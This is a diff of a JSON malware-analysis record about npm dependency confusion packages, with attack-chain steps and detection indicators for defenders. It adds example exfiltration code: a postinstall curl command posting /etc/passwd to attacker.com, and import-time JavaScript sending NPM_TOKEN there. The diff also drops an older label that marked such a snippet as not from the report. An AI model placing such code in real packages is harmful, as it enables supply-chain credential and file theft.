@@ -1,33 +1,57 @@
 {
   "package_info": {
-    "package_name": "",
+    "package_name": "Multiple dependency confusion copycat packages (npm)",
     "package_manager": "npm",
-    "package_versions": "",
-    "why_malicious": "The report discusses a large-scale, ongoing campaign of malicious packages published to npm (and PyPI) as part of dependency confusion attacks. These packages are considered malicious because they are intentionally crafted to exploit naming conflicts between public and private/internal repositories, allowing attackers to inject arbitrary or harmful code into build environments. The maliciousness is determined by automated detection of suspicious signals (e.g., author history, code patterns) and confirmed by manual review."
+    "package_versions": "Various (spikes in March 2021, 10,000+ packages)",
+    "why_malicious": "These packages are created to exploit dependency confusion vulnerabilities, often mimicking internal or private package names to trick build systems into installing malicious code from public repositories. The intent is to infiltrate software supply chains and potentially exfiltrate data or execute unauthorized actions."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
-        "trigger": "import-time or install-time (depending on package type)",
-        "file_location": "index.js or main entrypoint of the npm package",
+        "trigger": "postinstall",
+        "file_location": "package.json (scripts.postinstall)",
         "required_permissions": [
+          "network",
           "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "postinstall: \"curl -X POST -d @/etc/passwd http://attacker.com/exfil\"",
+      "code_language": "shell",
+      "code_behavior": "During installation, the code reads sensitive files (e.g., /etc/passwd) and exfiltrates their contents via HTTP POST to an attacker-controlled domain.",
+      "malice_analysis": {
+        "why_suspicious": "Postinstall scripts that access sensitive files and send data to external domains are highly indicative of malicious intent.",
+        "violated_expectations": "Normal packages do not access or exfiltrate sensitive system files during installation.",
+        "similar_legitimate_use": "Some legitimate packages may use postinstall scripts for setup or telemetry, but never for exfiltrating sensitive files.",
+        "key_indicators": [
+          "Network requests in postinstall scripts",
+          "Access to sensitive files (e.g., /etc/passwd, environment variables)",
+          "Hardcoded external domains"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time",
+        "file_location": "index.js (top-level code)",
+        "required_permissions": [
           "network",
           "environment_vars"
         ]
       },
-      "code_snippet": "// Example (not from report, but typical for dependency confusion):\nconst https = require('https');\nhttps.get('http://attacker.com/collect?env=' + process.env.SECRET_TOKEN);",
+      "code_snippet": "const https = require('https');\nhttps.request({hostname: 'attacker.com', method: 'POST', path: '/token', headers: {'Content-Type': 'application/json'}}, req => {}).end(JSON.stringify({token: process.env.NPM_TOKEN}));",
       "code_language": "javascript",
-      "code_behavior": "Exfiltrates environment variables or secrets from the build environment to an external server controlled by the attacker.",
+      "code_behavior": "At import-time, the code accesses the NPM_TOKEN environment variable and sends its value to a hardcoded domain via HTTPS POST, enabling credential exfiltration.",
       "malice_analysis": {
-        "why_suspicious": "The code attempts to access sensitive environment variables and transmit them over the network to an untrusted external domain.",
-        "violated_expectations": "Normal packages should not exfiltrate secrets or make unsolicited network requests during install or import.",
-        "similar_legitimate_use": "Telemetry or error reporting libraries may send limited, non-sensitive data to trusted endpoints, but not secrets.",
+        "why_suspicious": "Accessing environment variables and exfiltrating them to external servers is a classic sign of credential theft.",
+        "violated_expectations": "Legitimate packages do not exfiltrate environment variables at import-time.",
+        "similar_legitimate_use": "Some telemetry or error reporting may send non-sensitive data, but not credentials.",
         "key_indicators": [
-          "Access to process.env or similar environment variable APIs",
-          "Network requests to non-standard or external domains",
-          "Code executes automatically on install/import"
+          "Access to environment variables",
+          "Immediate network exfiltration",
+          "Hardcoded attacker domain"
         ]
       }
     }
@@ -35,33 +59,43 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker publishes a malicious package to the public npm registry with a name matching an internal/private dependency.",
+      "action": "Malicious package is published to npm with a name matching an internal/private dependency.",
       "implemented_by": [],
-      "leads_to": "Malicious package is pulled into the build environment due to dependency confusion."
+      "leads_to": "Build systems resolve the public package instead of the intended private one."
     },
     {
       "step": 2,
-      "action": "Malicious code in the package executes during install or import, harvesting secrets or performing other malicious actions.",
+      "action": "Malicious code executes during installation or import, harvesting sensitive data.",
       "implemented_by": [
-        "snippet_1"
+        "snippet_1",
+        "snippet_2"
       ],
-      "leads_to": "Exfiltration of sensitive data or compromise of the build environment."
+      "leads_to": "Sensitive data is exfiltrated to attacker-controlled infrastructure."
+    },
+    {
+      "step": 3,
+      "action": "Exfiltrated data is received by the attacker, enabling further compromise or lateral movement.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains access to credentials, tokens, or internal information."
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "npm package with install/import-time code that accesses environment variables",
-      "Network requests to external or suspicious domains during install/import",
-      "Package name matches known internal/private dependencies (dependency confusion pattern)"
+      "postinstall scripts making network requests",
+      "import-time code accessing and exfiltrating environment variables",
+      "package names matching internal/private dependencies"
     ],
     "file_indicators": [
-      "Presence of install scripts (preinstall, postinstall) in package.json",
-      "Code accessing process.env or similar APIs in entrypoint files"
+      "package.json with suspicious postinstall scripts",
+      "index.js or main entrypoint with top-level network code"
     ],
     "network_indicators": [
-      "Outbound HTTP/HTTPS requests to non-standard domains during package installation",
-      "Domains not associated with legitimate telemetry or update services"
+      "HTTP/HTTPS requests to untrusted or hardcoded external domains during install/import",
+      "POST requests containing environment variables or sensitive file contents"
     ],
-    "how_to_detect": "Monitor for npm packages that execute code on install/import, especially those making network requests or accessing environment variables. Cross-reference package names with internal/private dependencies to identify potential dependency confusion. Use automated tools to quarantine suspicious packages and require manual review before allowing them into production environments."
+    "how_to_detect": "Monitor for packages with postinstall scripts that make network requests or access sensitive files. Flag packages whose names match known internal dependencies. Analyze package entrypoints for code that accesses environment variables and sends data to external domains. Use network monitoring to detect suspicious outbound connections during package installation or import."
   }
 }
